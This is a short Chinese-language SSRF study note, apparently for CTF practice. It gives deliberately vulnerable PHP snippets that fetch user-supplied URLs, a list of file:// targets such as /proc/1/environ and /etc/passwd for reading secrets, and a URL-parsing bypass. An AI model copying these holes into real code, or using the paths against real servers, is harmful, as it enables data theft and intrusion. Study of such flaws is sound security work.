ssrf

服务端请求伪造

[TOC]



##### fsockopen()

```
fsockopen()

fsockopen(h o s t n a m e , hostname,hostname,port,e r r n o , errno,errno,errstr,$timeout)
```

用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。 fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false

```
<?php
$host=$_GET['url'];
$fp = fsockopen($host, 80, $errno, $errstr, 30);
if (!$fp) {
    echo "$errstr ($errno)<br />\n";
} else {
    $out = "GET / HTTP/1.1\r\n";
    $out .= "Host: $host\r\n";
    $out .= "Connection: Close\r\n\r\n";
    fwrite($fp, $out);
    while (!feof($fp)) {
        echo fgets($fp, 128);
    }
    fclose($fp);
}
?>
```

###### curl_exec()

```
<?php 
$url=$_POST['url']; 
$ch=curl_init($url);  //创造一个curl资源
curl_setopt($ch, CURLOPT_HEADER, 0); //设置url和相应的选项
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$result=curl_exec($ch); // 抓取url并将其传递给浏览器
curl_close($ch); //关闭curl资源
echo ($result); 
?>


```

**file_get_contents()/readfile()**

```
<?php
$url = $_GET['url'];;
echo file_get_contents($url);
?>
```

###### 先读读这些

```
file:///start.sh

file:///proc/1/environ

file:///app/app.py
```

```
1 /etc/passwd用来判断读取漏洞的存在
2 /etc/environment
3 是环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况。
4 /etc/hostname/etc/hostname
5 表示主机名。
6 /etc/issue
7 指明系统版本。
8 /proc目录
9 /proc/[pid] 查看进程
10 /proc/self 查看当前进程
11 /proc/self/cmdline 当前进程对应的终端命令
12 /proc/self/pwd程序运行目录
13 /proc/self/环境变量
14 /sys/class/net/eth0/address mac地址保存位置
```

###### parse_url   & curl

url=http://a:@127.0.0.1:80@baidu.com/flag.php，

[----已搬运----【总章程】SSRF完全学习，，什么都有，，，原理，绕过，攻击_python ssrf漏洞读取文件绕过file-CSDN博客](https://blog.csdn.net/Zero_Adam/article/details/117728234?ops_request_misc=&request_id=&biz_id=102&utm_term=[第二章 web进阶]SSRF Training&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-117728234.142^v99^pc_search_result_base1&spm=1018.2226.3001.4187)